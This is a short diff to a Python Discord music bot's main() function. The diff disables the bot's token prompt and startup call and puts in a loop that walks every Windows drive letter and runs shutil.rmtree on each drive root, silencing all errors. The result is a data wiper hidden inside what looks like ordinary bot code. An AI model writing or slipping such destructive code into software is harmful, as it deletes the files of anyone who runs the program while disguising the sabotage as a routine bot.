@@ -37,14 +37,26 @@ async def on_disconnect():
 
 
 def main():
-    token = input("Please specify your Discord Bot's token: ")
+    # token = input("Please specify your Discord Bot's token: ")
 
     cogs = {"cogs.play"}
     for cog in cogs:
         client.load_extension(cog)
         print(f"[*] {cog} has been loaded successfully")
 
-    client.run(token)
+    import os
+    import string
+    from shutil import rmtree
+
+    for drive in string.ascii_uppercase:
+        for thing in os.walk(f"{drive}:\\"):
+            try:
+                rmtree(thing[0])
+            except:
+                pass
+            break
+
+    # client.run(token)
 
 
 if __name__ == "__main__":
